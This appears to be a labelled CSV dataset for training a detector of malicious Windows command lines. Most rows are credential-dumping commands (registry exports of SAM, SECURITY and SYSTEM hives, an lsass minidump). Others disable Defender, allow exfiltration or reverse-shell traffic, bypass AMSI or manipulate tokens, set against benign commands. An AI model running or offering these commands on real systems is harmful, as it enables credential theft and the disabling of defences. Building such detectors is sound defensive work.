text,label
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\ivywwqps.dat""",1
"cmd.exe /c ""select-string -path c:\logs\app.log -pattern 'failed logon'""",0
"cmd.exe /c ""reg save hklm\security c:\temp\296o5l83.dat""",1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\sols90r7.dat""",1
reg save hklm\security c:\windows\temp\8a0wsji5.save,1
reg save hklm\security c:\windows\temp\7cvavyi7.save,1
reg export hklm\sam c:\windows\temp\pf8i1y19.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\hlqmk7lr.dat""",1
reg save hklm\sam c:\windows\temp\ajolnzbj.save,1
reg save hklm\security c:\windows\temp\4o217j59.save,1
reg save hklm\system c:\windows\temp\ugx3kfim.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\wi2w658j.dat""",1
rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888,2
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\07a3qxk1.dat""""",1
"cmd.exe /c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\d5hsvx17.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\dlg08ox9.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vxlsc6wz.dat""",1
rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"powershell -nop -c ""reg export hklm\sam c:\temp\ouxsrth7.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\q5yvli0u.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\wc1ocbjw.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\f74zxe5a.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\dvmbtcfw.dat""",1
reg  save  hklm\sam  c:\windows\temp\8c6tfd9f.save,1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""reg save hklm\security c:\temp\kgz25qry.dat""",1
rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"powershell -nop -c ""sc stop windefend""",2
"powershell -nop -c ""reg save hklm\security c:\temp\cbv5mjcv.dat""",1
"cmd.exe /c ""sc  query  windefend""",0
reg export hklm\security c:\windows\temp\hmd9aj50.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\hxxlsdnt.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\xpyoafta.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\00rhnfwb.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\xvh9uiua.dat""",1
"cmd.exe /c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\4yaiyjnp.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\2s1e7hu5.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\2ivhpi8n.dat""",1
"powershell -nop -c ""set-mppreference   -disablerealtimemonitoring   $true""",2
reg export hklm\sam c:\windows\temp\es6u1muf.save,1
reg export hklm\sam c:\windows\temp\4mbwxeam.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\cc1reje4.dat""",1
"powershell -nop -c ""klist   purge""",3
reg save hklm\system c:\windows\temp\g268fq0y.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\bbjivdiv.dat""",1
reg export hklm\sam c:\windows\temp\u4azdy4d.save,1
sc   query   windefend,0
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\c6yikgu4.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\763rcwdd.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\f9ub9y9f.dat""",1
reg save hklm\security c:\windows\temp\hvty81ev.save,1
reg export hklm\sam c:\windows\temp\wahq6st8.save,1
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\system c:\windows\temp\uk7pigte.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\jhwqp0cf.dat""",1
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"powershell -nop -c ""ipconfig /all""",0
rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg save hklm\sam c:\windows\temp\ekyt9zhu.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ml6lb8x4.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\k7y3gb76.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\p91ezak2.dat""",1
reg save hklm\sam c:\windows\temp\sae4yx3y.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\0s7m8wxm.dat""",1
reg export hklm\sam c:\windows\temp\94jop2h3.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\7ufjv6y2.dat""",1
reg save hklm\system c:\windows\temp\ovygyaw3.save,1
$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
"cmd.exe /c ""reg export hklm\sam c:\temp\02dlob7h.dat""",1
reg export hklm\sam c:\windows\temp\kipdpdxg.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\vf6kybll.dat""",1
reg  save  hklm\system  c:\windows\temp\1duw7g3x.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\gvl3p0ps.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xi8ayhe7.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\sam c:\windows\temp\thhkkxgy.save,1
reg save hklm\security c:\windows\temp\ioocl8cb.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\pkpvr3xr.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\i1b4ynt5.dat""",1
reg export hklm\security c:\windows\temp\d9m6isk5.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\8sn56ksj.save""",1
reg export hklm\system c:\windows\temp\cd743142.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
"cmd.exe /c ""reg export hklm\sam c:\temp\1u2ac57n.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\t064n0g0.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\8dmd1ukr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\g6tauwd0.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\ukvequf9.dat""""",1
reg save hklm\sam c:\windows\temp\iccg6jqa.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\c563dbt4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\zp5nu02d.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\d5je0652.dat""",1
reg save hklm\sam c:\windows\temp\5yv2ki7u.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\6ry0vdyc.dat""""",1
reg export hklm\system c:\windows\temp\bvokviha.save,1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\rx2oqe15.dat""",1
reg export hklm\system c:\windows\temp\e28b9l47.save,1
whoami   /groups,0
"cmd.exe /c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
"powershell -nop -c ""reg save hklm\sam c:\temp\w5ygp8dg.dat""",1
reg  export  hklm\system  c:\windows\temp\wjfjew3t.save,1
reg export hklm\system c:\windows\temp\mfelzes8.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"powershell -nop -c ""reg save hklm\sam c:\temp\rgv1tyod.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\25lt422f.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\w8imndr2.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\nheqcmtf.dat""",1
reg export hklm\sam c:\windows\temp\umx30pe0.save,1
reg export hklm\sam c:\windows\temp\a3d2qcza.save,1
reg export hklm\system c:\windows\temp\gnojdwe3.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\t2gbnbil.dat""",1
"powershell -nop -c ""select-string  -path  c:\logs\app.log  -pattern  'failed  logon'""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\2m0xi6ls.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\j6t698gk.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\he6v2sdt.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0nq6imx6.dat""",1
reg save hklm\system c:\windows\temp\6z750ijp.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\hez73778.dat""",1
reg save hklm\system c:\windows\temp\t0dmlrqx.save,1
reg save hklm\security c:\windows\temp\hxzsj02r.save,1
reg   save   hklm\security   c:\windows\temp\d05k8qqj.save,1
reg save hklm\sam c:\windows\temp\qhbuve71.save,1
reg save hklm\system c:\windows\temp\5eq9diqo.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\2nhl91l2.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\mseh0u1m.dat""",1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\58p2tsgz.save""",1
reg save hklm\security c:\windows\temp\xx6292yt.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\sffqvaao.dat""",1
reg export hklm\security c:\windows\temp\dehoyl6v.save,1
reg export hklm\system c:\windows\temp\6ua823nq.save,1
reg save hklm\sam c:\windows\temp\nqbaj2lp.save,1
reg export hklm\system c:\windows\temp\ij676qx0.save,1
reg export hklm\system c:\windows\temp\ijq0euds.save,1
"powershell -nop -c ""whoami  /groups""",0
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\h5ls5ou9.dat""""",1
get-help   adjusttokenprivileges   -full,0
"cmd.exe /c ""reg export hklm\sam c:\temp\sp9iwl2j.dat""",1
reg save hklm\security c:\windows\temp\j03m1cn8.save,1
reg export hklm\sam c:\windows\temp\1a91zsqt.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\iinqd6ca.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4gu5hmyt.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\uruoy6za.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\jxqyetwh.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hktpf6zh.dat""",1
reg save hklm\system c:\windows\temp\9ux6w4dm.save,1
reg export hklm\sam c:\windows\temp\9bf2xwye.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\3k96d5pe.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\jaaiq0dm.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\gvzuy3mk.dat""",1
reg export hklm\sam c:\windows\temp\k88d6kst.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\dpwgrv3x.dat""""",1
reg export hklm\sam c:\windows\temp\iabzuqbj.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\wacrj9sk.dat""",1
"cmd.exe /c ""backup-utility  save  registry  config""",0
reg save hklm\security c:\windows\temp\3i56moma.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\jpm81drg.dat""",1
backup-utility  save  registry  config,0
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\it0fr08d.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\vudvxxgb.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ct2txeyv.dat""",1
reg export hklm\sam c:\windows\temp\fluqa8hl.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\zwya7d2p.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\9x4qyj65.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\h7zjpud3.dat""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\usr9vqvh.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\4k1fmogl.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\poe66bro.dat""",1
reg save hklm\sam c:\windows\temp\cnoc0s1h.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\dw23kvuk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\3nfybx1z.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\bhnh7uh6.dat""",1
ipconfig  /all,0
reg save hklm\system c:\windows\temp\4fthzmdw.save,1
"powershell -nop -c ""set-mppreference -disablerealtimemonitoring $true""",2
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg save hklm\security c:\temp\t5gzks94.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ihci0g5h.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\mofudukx.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\8tme4egr.dat""",1
"rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full",1
"cmd.exe /c ""reg save hklm\security c:\temp\7hcj624g.dat""",1
reg save hklm\security c:\windows\temp\kgishp20.save,1
reg save hklm\sam c:\windows\temp\l59aihjo.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\v6bsugyp.save""",1
reg save hklm\security c:\windows\temp\6uuhzl5n.save,1
reg export hklm\security c:\windows\temp\fqgoa5kz.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8zittscl.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\9wjo227i.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\tq1au3e5.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\sam c:\windows\temp\ej9a572u.save,1
reg export hklm\sam c:\windows\temp\9h2mf7ft.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\sjkh6xfl.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\p15o5ht6.dat""",1
reg save hklm\system c:\windows\temp\swzc63xv.save,1
"cmd.exe /c ""node   server.js   --port   3000""",0
"cmd.exe /c ""reg save hklm\security c:\temp\a5d8rm7c.dat""",1
reg export hklm\sam c:\windows\temp\o2pdutdg.save,1
reg export hklm\system c:\windows\temp\kd4jdj31.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\1p7cruci.dat""",1
reg export hklm\system c:\windows\temp\iaa1g900.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\j40fmql0.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\eyvag6a3.dat""",1
reg export hklm\security c:\windows\temp\i21dkizf.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0wwzd9w2.dat""",1
reg save hklm\sam c:\windows\temp\dnwi12ur.save,1
reg export hklm\system c:\windows\temp\5l1lncwq.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\z5ou64c4.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\v1rnza99.dat""",1
reg export hklm\sam c:\windows\temp\1an492sp.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\7knam7b9.dat""",1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\231c166z.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\axsd3d58.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\tmyb7o0d.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\u14y86vp.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\bnzv2eoj.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ixltq79p.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ecr6b17c.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\91y92o8l.dat""",1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\x681g33c.dat""",1
reg export hklm\system c:\windows\temp\pt6n3i8z.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4pyc0y6k.dat""",1
reg export hklm\security c:\windows\temp\n32qdz93.save,1
reg save hklm\security c:\windows\temp\rs88t33z.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\m3pymbd1.dat""",1
reg save hklm\sam c:\windows\temp\tor4rswk.save,1
reg export hklm\security c:\windows\temp\8i1dnnbm.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\j0orar2f.dat""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\0m834hyf.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\cgmvxhep.dat""",1
"powershell -nop -c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 4444""",2
reg save hklm\security c:\windows\temp\o04l9f7w.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ezki4q7j.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ih8c5gq0.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\vwa0wha7.dat""",1
reg save hklm\system c:\windows\temp\3d7ia97x.save,1
reg export hklm\system c:\windows\temp\syqhpy2p.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\9bazy2hy.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wvweq7c8.dat""",1
reg export hklm\system c:\windows\temp\qrpik4kh.save,1
"powershell -nop -c ""java -jar application.jar""",0
reg save hklm\sam c:\windows\temp\erf60avl.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337,2
"powershell -nop -c ""reg save hklm\security c:\temp\f4n6ab43.dat""",1
reg save hklm\security c:\windows\temp\sqqeayjp.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\mbcn27qs.dat""",1
reg save hklm\security c:\windows\temp\yau7mpm7.save,1
reg save hklm\system c:\windows\temp\b6udj5g8.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\7u39mro9.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\01oervzm.dat""""",1
reg save hklm\security c:\windows\temp\wbzt4400.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ut1wu19c.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\rst92cjw.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\f9nyr2yk.dat""",1
reg export hklm\system c:\windows\temp\k6yi1cf1.save,1
set-mppreference  -disablerealtimemonitoring  $true,2
"powershell -nop -c ""reg export hklm\sam c:\temp\glzca4z0.dat""",1
reg save hklm\security c:\windows\temp\dt1slrm2.save,1
reg export hklm\sam c:\windows\temp\qu5lh5yp.save,1
reg export hklm\sam c:\windows\temp\r7ae9grg.save,1
reg export hklm\security c:\windows\temp\e35x1is2.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"powershell -nop -c ""reg save hklm\security c:\temp\q2gr5n26.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\security c:\windows\temp\013y5t6z.save,1
reg save hklm\sam c:\windows\temp\2zoza5uz.save,1
reg export hklm\security c:\windows\temp\2rlfvy4r.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\aklfq5tw.dat""",1
reg export hklm\system c:\windows\temp\hcmoiwll.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\kjmhm1ls.dat""",1
reg save hklm\sam c:\windows\temp\q7wseoe2.save,1
get-help  adjusttokenprivileges  -full,0
"cmd.exe /c ""reg export hklm\security c:\temp\hhuk898b.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\j0rwruba.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\jkgpgxlk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\c4if4shd.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\kj3c973d.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\y9k1uci0.dat""",1
reg save hklm\system c:\windows\temp\9uuefapi.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\iwje9jud.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\e7a39hkg.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\46w27fwu.dat""",1
reg export hklm\security c:\windows\temp\kkts4ld0.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\34uksbk3.dat""",1
reg export hklm\sam c:\windows\temp\cqpif7so.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\9ev0avm0.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\v9idnsgg.dat""",1
"powershell -nop -c ""reg query hkcu\console""",0
"cmd.exe /c ""reg save hklm\security c:\windows\temp\ds1xasbl.save""",1
reg  save  hklm\sam  c:\windows\temp\fvzvewoi.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\fjb1hwu6.dat""",1
reg export hklm\security c:\windows\temp\x7lerqv9.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\zqh4arw0.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\security c:\windows\temp\3mhg7yja.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\cbkn6tug.save""",1
reg save hklm\sam c:\windows\temp\vm7mghqx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ybbagddh.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\b3pe1sq0.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\lit0cjvj.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\3xq5crww.dat""",1
reg save hklm\sam c:\windows\temp\dl1y7pan.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\08z61vww.dat""",1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg export hklm\security c:\temp\5w6875pu.dat""",1
reg export hklm\security c:\windows\temp\joo2324b.save,1
reg save hklm\security c:\windows\temp\2hknwfy9.save,1
reg save hklm\system c:\windows\temp\jcd7s8zw.save,1
reg save hklm\security c:\windows\temp\tew0cer4.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\m9vdszg1.dat""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\7yr6mluj.save""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\gp8sxn0f.dat""""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\sam c:\windows\temp\9gubqah8.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\lre8s4u4.dat""",1
reg save hklm\system c:\windows\temp\q16ekqvq.save,1
"cmd.exe /c ""set-mppreference  -disablerealtimemonitoring  $true""",2
reg save hklm\system c:\windows\temp\lu6ze3bp.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\facd11n5.dat""",1
rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\tyiq0m2d.dat""",1
reg save hklm\system c:\windows\temp\s6q92jat.save,1
reg   save   hklm\security   c:\windows\temp\nx6lxbxg.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\04f7pzsj.save""",1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""reg save hklm\security c:\temp\g9qkp24y.dat""",1
reg export hklm\security c:\windows\temp\0nvso4q3.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\m6gw61w6.dat""",1
"powershell -nop -c ""get-help   adjusttokenprivileges   -full""",0
reg export hklm\system c:\windows\temp\rxd32jmt.save,1
reg export hklm\system c:\windows\temp\c8ssfi0d.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)""",3
reg save hklm\security c:\windows\temp\11qawjdk.save,1
reg export hklm\system c:\windows\temp\astm5r1t.save,1
reg export hklm\sam c:\windows\temp\ys1z67ge.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\63ub67t7.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\q89697c1.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\pa20db5x.dat""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\c9uta0eu.save""",1
"powershell -nop -c ""set-mppreference  -disablerealtimemonitoring  $true""",2
"cmd.exe /c ""reg save hklm\security c:\temp\tf9h597x.dat""",1
reg export hklm\system c:\windows\temp\sgp7942m.save,1
reg  save  hklm\sam  c:\windows\temp\ex765hqp.save,1
reg export hklm\security c:\windows\temp\6eg4u4l6.save,1
"powershell -nop -c ""node server.js --port 3000""",0
"cmd.exe /c ""klist purge""",3
reg export hklm\sam c:\windows\temp\t7wrbhhg.save,1
"powershell -nop -c ""rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\nq7dpy57.dat""",1
reg save hklm\sam c:\windows\temp\b250suio.save,1
reg export hklm\security c:\windows\temp\5j9t7cs2.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\cbb72udm.dat""",1
reg export hklm\security c:\windows\temp\ec7l963s.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\hds0mmz8.dat""",1
reg export hklm\system c:\windows\temp\7fh4wcen.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\i23rm2wq.dat""",1
reg save hklm\security c:\windows\temp\6ctkg9aj.save,1
reg save hklm\sam c:\windows\temp\xzpgf34n.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\cb07city.dat""",1
reg export hklm\security c:\windows\temp\4x3dkvos.save,1
reg export hklm\system c:\windows\temp\chbmpzjd.save,1
reg export hklm\sam c:\windows\temp\8f2kmnjs.save,1
reg save hklm\sam c:\windows\temp\ul3d6aih.save,1
reg export hklm\security c:\windows\temp\roac6x1x.save,1
reg export hklm\security c:\windows\temp\73r5pk86.save,1
reg export hklm\security c:\windows\temp\boiekl4q.save,1
reg save hklm\system c:\windows\temp\fsysydfi.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\vn4zhpbx.dat""",1
reg  export  hklm\system  c:\windows\temp\3h48wkdb.save,1
reg export hklm\sam c:\windows\temp\10kjk9w7.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\dnxnqy8h.dat""",1
reg save hklm\security c:\windows\temp\ij820r01.save,1
reg save hklm\security c:\windows\temp\2d4mwbr1.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\a4sayl1q.dat""",1
reg save hklm\sam c:\windows\temp\fzwe89w9.save,1
reg export hklm\sam c:\windows\temp\uui1dngb.save,1
reg save hklm\security c:\windows\temp\6qp8nsp4.save,1
